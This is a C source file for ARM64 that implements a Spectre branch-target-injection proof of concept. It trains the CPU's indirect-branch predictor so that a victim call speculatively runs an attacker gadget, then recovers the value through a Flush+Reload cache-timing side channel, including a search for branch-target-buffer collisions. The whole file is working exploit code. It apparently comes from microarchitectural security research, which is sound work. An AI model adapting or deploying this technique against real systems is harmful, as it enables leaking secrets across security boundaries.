#define _GNU_SOURCE 1

#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include "flush_reload.h"
#include "timing.h"
#include "utils.h"

#define POINTER_CHASE_LEN 1


#define STP 0xa9be7bfd   // stp x29, x30, [sp, #-32]  push frame pointer & link reg onto stack
#define MOV 0x910003fd   // mov x29, sp               set frame pointer to stack pointer
#define LDR 0xF9400294   // ldr x20, [x20]            load function pointer from "pointer chase"
#define NOP 0xD503201F   // nop
#define BLR 0xd63f0280   // blr x20                   branch to x20 & store current PC to link reg
#define LDP 0xa8c27bfd   // ldp x29, x30, [sp, #32]   pop frame pointer & link reg off stack
#define RET 0xd65f03c0   // ret                       return (to link reg)

/* Training and victim sequences for the out-of-place scenario.
   Both do an indirect call:
    - training: call to fptr x20
    - victim: load value at ptr x20 into x20, and call fptr x20
   The goal of the attack will be to have the CPU mispredit the destination
   of the call in victim_jump and speculatively execute our gadget.

   The two sequences will be relocated to their own page. See `victim_executable` 
   and `attacker_executable`.
*/
uint32_t const training_jump[] = {STP, MOV, NOP, BLR, LDP, RET};
uint32_t const victim_jump[]   = {STP, MOV, LDR, BLR, LDP, RET};

#define JUMP_LEN sizeof(training_jump)

char * fr_buffer = 0;
uint64_t atimes[256] = {0};


// the function called at the vicitim callsite
// implementation not important
int f(void)
{
    return 10;
}

// attacker function (gadget)
// make the value in register x21 available in the F+R buffer
int g(void)
{

    // for some reason ldr works but not str !
    asm volatile(
        "and x21, x21, #0xff\n\t"
        "LSL x21, x21, #7\n\t"
        //"str x21, [%0, x21]\n\t"
        "ldr x21, [%0, x21]\n\t"
        : "+r"(fr_buffer)
        :
        : "x21"
    );
    // for some reason, this loop is necessary!!
    for(int i = 0 ; i < 100; i++);
    return 0;
}

/* Victim callsite in the in-place scenario. The aim of the attack will be
   to have the CPU mispredict the destination of the indirect call so that
   it speculatively executes our gadget g.
*/
int call_indirect(int(**f)(void))
{
    return (*f)();
}


int main(int argc, char ** argv)
{
    /***********
     * Init
     ***********/
    
    //F+R buffer
    fr_buffer = alloc_flush_reload();

    uint64_t pagesize = sysconf(_SC_PAGESIZE);
    printf("pagesize=%" PRIu64 " entry_size=%" PRIu64 "\n", pagesize, FLUSH_RELOAD_ENTRY_SIZE);

    /***********
     * Timing test
     **********/
    int * a = malloc(30);

    uint64_t t0 = time_access(a);

    flush(a);

    uint64_t t1 = time_access(a);

    fprintf(stderr, "t0 = %" PRIu64 "\n", t0);
    fprintf(stderr, "t1 = %" PRIu64 "\n", t1);

    //uint64_t thresh = (t1 + t0) / 2;
    uint64_t thresh = 28;
    fprintf(stderr, "threshold = %" PRIu64 "\n\n", thresh);



    /***********
     * Spectre-BTB
     **********/


    /****************
      Prepare pointer chase
      To access the address of the victim function f, the victim will need to dereference a pointers:
        x20 <- ptrs[0]
        ldr x20, [x20]
        blr x20
      The pointer is stored in its own cacheline that we flush before the victim code is called.

      In the training part, the pointer to g is given directly.
    ****************/

    // pointer chase for f: POINTER_CHASE_LEN cachelines are allocated
    void ** f_ptr = mmap(
        NULL,
        128, // one cacheline size
        PROT_READ | PROT_WRITE,
        MAP_SHARED | MAP_ANONYMOUS,
        -1,
        0
    );
    f_ptr[0] = &f;
    
    void ** g_ptr = mmap(
        NULL,
        128, // one cacheline size
        PROT_READ | PROT_WRITE,
        MAP_SHARED | MAP_ANONYMOUS,
        -1,
        0
    );
    g_ptr[0] = &g;


    /***********
     * Same-address space in-place (SA-IP) training and attack
     * To test F+R sidechannel
     ***********/

    fprintf(stderr, "Same address-space, inplace training and attack:\n");

    for(size_t run = 0; run < 10; run++)
    {
        #define SA_IP_NROUNDS 10000

        full_fence();


        /* Training */
        for(size_t i = 0; i < SA_IP_NROUNDS ; i++)
        {
            asm volatile(
                "mov x21, #5\n\t"
                :
                : 
                :
            );

            call_indirect(g_ptr);
        
        }

        asm volatile(
            "mov x21, #13\n\t"
            :
            : 
            :
        );

        /* Victim */
        flush_buffer(fr_buffer);
        // Make address of f slower to access by flushing the intermediate
        // cacheline in the pointer chase
        flush(f_ptr);
        full_fence();
        call_indirect(f_ptr);

        full_fence();

        reload(fr_buffer, atimes);

        fprintf(stderr, "low atimes:");
        for(int c = 0; c < 256; c++){
            if (atimes[c] < thresh) {
                fprintf(stderr, "%d(%" PRIu64 ") ", c, atimes[c]);
            }
        }
        fprintf(stderr, "\n");
        
        if (atimes[13] < thresh) {
            fprintf(stderr, "MISPREDICT   access_time= %" PRIu64 "\n", atimes[13]);
        }
    }


    /***********
     * Same-address space out of place (SA-OOP) training and attack
     ***********/
    fprintf(stderr, "Same address-space, out-of-place training and attack:\n");

    /* Relocate the training and victim indirect call to their own page.*/

    // Allocate memory for executable victim
    unsigned char* victim_executable = mmap(
        NULL,
        4096,
        PROT_READ | PROT_WRITE,
        MAP_SHARED | MAP_ANONYMOUS,
        -1,
        0
    );
    // Write executable to victim address
    memcpy(victim_executable, victim_jump, JUMP_LEN);
    // Set executable permission
    mprotect(victim_executable, 4096, PROT_READ | PROT_EXEC);
    uint64_t victim_code_addr = (uint64_t)victim_executable;

    /* Try different locations for the train code, to find collisions in the BTB */
    for(int shift = 20; shift < 48; shift++)
    {
        fprintf(stderr, "Shift %d:\n", shift);
        uint64_t attacker_code_addr = ((uint64_t)1 << shift) ^ victim_code_addr;

        // Allocate memory for executable attacker code
        unsigned char* attacker_executable = mmap(
            (void*) attacker_code_addr,
            4096,
            PROT_READ | PROT_WRITE,
            MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED,
            -1,
            0
        );
        if (attacker_executable == MAP_FAILED) {
            perror("mmap");
            continue;
        }

        // Write executable to attack address
        memcpy(attacker_executable, training_jump, JUMP_LEN);
        // Set executable permission
        mprotect(attacker_executable, 4096, PROT_READ | PROT_EXEC);

        // Training
        for (size_t i = 0 ; i < 10000; i++)
        {
            asm volatile(
                "mov x21, #5\n\t"  // set F + R value to 5
                "mov x20, %0\n\t"  // run g indirectly. training => directly pass pointer to g
                "stp x29, x30, [sp, #-32]\n\t"
                "mov x29, sp\n\t"
                "blr %1\n\t"
                :
                :"r"(&g), "r"(attacker_executable)
                :
            );
        }
        
        full_fence();
        
        // Victim

        // Make address of f slower to access by flushing the intermediate
        // cachelines in the pointer chase
        flush(f_ptr);
        // Prepare flush reload
        flush_buffer(fr_buffer);

        asm volatile(
            "mov x21, #42\n\t"  // set F + R value to 42
            "mov x20, %0\n\t"   // run f indirectly. attack => pass "pointer chase" to f
            "stp x29, x30, [sp, #-32]\n\t"
            "mov x29, sp\n\t"
            "blr %1"
            :
            :"r"(f_ptr), "r"(victim_executable)
            :
        );

        reload(fr_buffer, atimes);
        
        fprintf(stderr, "low atimes:");
        for(int c = 0; c < 256; c++){
            if (atimes[c] < thresh) {
                fprintf(stderr, "%d(%" PRIu64 ") ", c, atimes[c]);
            }
        }
        fprintf(stderr, "\n");
        
        if (atimes[42] < thresh) {
            fprintf(stderr, "COLLISION   access_time=%" PRIu64 "\n", atimes[42]);
            fprintf(stderr, "%p %p\n\n", victim_executable, attacker_executable);
        }

        munmap(attacker_executable, 4096);
    }
}